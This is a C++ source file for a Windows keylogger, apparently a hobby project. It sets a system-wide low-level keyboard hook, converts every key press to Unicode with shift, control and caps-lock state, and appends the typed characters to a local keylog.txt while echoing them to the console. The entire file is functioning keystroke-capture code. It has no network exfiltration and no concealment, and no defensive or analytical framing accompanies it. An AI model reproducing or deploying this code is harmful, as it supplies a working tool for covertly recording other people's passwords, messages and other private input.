#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
#include <codecvt>
#include <locale>
using namespace std;

//Opening keylog.txt
ofstream logfile("keylog.txt", ios::app);

//A string to convert unicode (UTF-16) to UTF-8. This is to output the key input correctly to the file keylog.txt 
string narrow(const wchar_t *wideChar)
{
    wstring_convert<codecvt_utf8<wchar_t>> converter;
    return converter.to_bytes(wideChar);
}


//The function that makes all this posible.
LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
        if (nCode < 0) 
        {
        return CallNextHookEx(NULL, nCode, wParam, lParam);
        }

        if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
        {
            KBDLLHOOKSTRUCT *kbd = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);

            wchar_t unicodeChar[3] = {0};
            BYTE keyboardState[256] = {0};
            DWORD result = 0;

            GetKeyboardState(keyboardState);

            //Checks if shift is pressed
            if (GetKeyState(VK_SHIFT) & 0x8000 || GetKeyState(VK_LSHIFT) & 0x8000 || GetKeyState(VK_RSHIFT) & 0x8000)
            {
                //If pressed keyboardstate gets the value 0x80 (10000000) to indicate that SHIFT is enabled.
                keyboardState[VK_SHIFT] |= 0x80;
            }
            else
                //If not pressed keayboard state gets a value of 0x7F (0111111) to indicate that SHIFT is disabled
            {
            keyboardState[VK_SHIFT] &= 0x7F;
            }

            if (GetKeyState(VK_CONTROL) & 0x8000)
            {
                //If pressed keyboardstate gets the value 0x80 (10000000) to indicate that CTRL is enabled.
                keyboardState[VK_CONTROL] |= 0x80;
            }
            else
            {
                //If not pressed keayboard state gets a value of 0x7F (0111111) to indicate that CTRL is disabled
                keyboardState[VK_CONTROL] &= 0x7F;
            }

            if (GetKeyState(VK_CAPITAL) & 0x0001)
            {
                 //If pressed keyboardstate gets the value 0x01 (00000001) to indicate that CAPS_LOCK is enabled.
                keyboardState[VK_CAPITAL] |= 0x01;
            }
            else
            {
                //If pressed keyboardstate gets the value 0x01 (11111110) to indicate that CAPS_LOCK is disabled.
                keyboardState[VK_CAPITAL] &= 0xFE;
            }

            result = ToUnicode(kbd->vkCode, kbd->scanCode, keyboardState, unicodeChar, 3, 0);
            
            if (result > 0)
            {
                wcout << L"Unicode character: " << unicodeChar << endl;
                wstring wideStr(unicodeChar);
                logfile << narrow(wideStr.c_str());
                logfile.flush();
            }
        }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

    

int main()
{
    // Error check to see if logfile.txt can be opend.
    if (!logfile.is_open()) {
        cout << "Error: Unable to open output file." << endl;
        return 1;
    }

    //Enableling a low level keyboard hook that intercepts keyboard input.
    HHOOK keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, &KeyboardHook, NULL, 0);

    //Error checking if het hook was succesfull
    if (keyboard == NULL)
    {
        cout << "Error: Unable to set keyboard hook." << endl;
        logfile.close();
        return 1;
    }
 
    //Making sure the code keeps running until a WM_QUID message is read.
    MSG message;
    while (GetMessage(&message, NULL, 0, 0) > 0)
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    //Cleaning the hook
    UnhookWindowsHookEx(keyboard);

    //Closing Logfile.txt
    logfile.close();

    return 0;
}

//testchange huh